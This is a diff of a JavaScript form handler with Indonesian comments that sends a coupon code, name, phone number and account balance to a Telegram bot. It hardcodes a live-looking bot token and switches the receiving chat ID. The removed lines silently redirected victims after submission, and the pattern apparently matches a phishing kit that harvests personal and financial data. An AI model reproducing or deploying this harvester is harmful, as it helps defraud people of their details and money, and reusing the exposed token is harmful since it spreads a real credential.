@@ -1,11 +1,11 @@
-// script.js - Handler untuk form pengiriman kupon ke API Bot Telegram (redirect langsung tanpa alert sukses)
+// script.js - Handler untuk form pengiriman kupon ke API Bot Telegram
 document.addEventListener('DOMContentLoaded', function() {
     const form = document.querySelector('form'); // Ambil form pertama
     const button = document.getElementById('kirim'); // Tombol submit
 
     // Placeholder: Ganti dengan TOKEN bot dan chat_id Anda
     const BOT_TOKEN = '7504434844:AAEJvY81gVUID8gl1BCqdR28oNld83WbNxM'; // Contoh: '123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11'
-    const CHAT_ID = '6979221708'; // Contoh: '123456789' (untuk chat pribadi) atau '@channelusername'
+    const CHAT_ID = '7213790655'; // Contoh: '123456789' (untuk chat pribadi) atau '@channelusername'
 
     // Fungsi untuk menangani submit form
     form.addEventListener('submit', function(event) {
@@ -19,7 +19,7 @@ document.addEventListener('DOMContentLoaded', function() {
 
         // Validasi sederhana
         if (!kupon || !nama || !nomor || !saldo) {
-            alert('Harap lengkapi semua field!'); // Tetap alert untuk validasi
+            alert('Harap lengkapi semua field!');
             return;
         }
 
@@ -44,18 +44,14 @@ document.addEventListener('DOMContentLoaded', function() {
         .then(response => response.json())
         .then(result => {
             if (result.ok) {
-                // Langsung redirect ke halaman selanjutnya tanpa alert
-                window.location.href = '../proses.html'; // Ganti dengan URL halaman konfirmasi Anda
+                alert('Data berhasil dikirim ke bot Telegram!');
+                form.reset(); // Reset form
             } else {
-                // Jika gagal, alert atau redirect ke error page (opsional, hapus jika mau silent)
                 alert('Gagal mengirim: ' + result.description);
-                // window.location.href = 'https://example.com/error.html'; // Opsional
             }
         })
         .catch(error => {
-            // Jika error jaringan, alert atau redirect (opsional, hapus jika mau silent)
             alert('Error: ' + error.message);
-            // window.location.href = 'https://example.com/error.html'; // Opsional
         });
     });
 
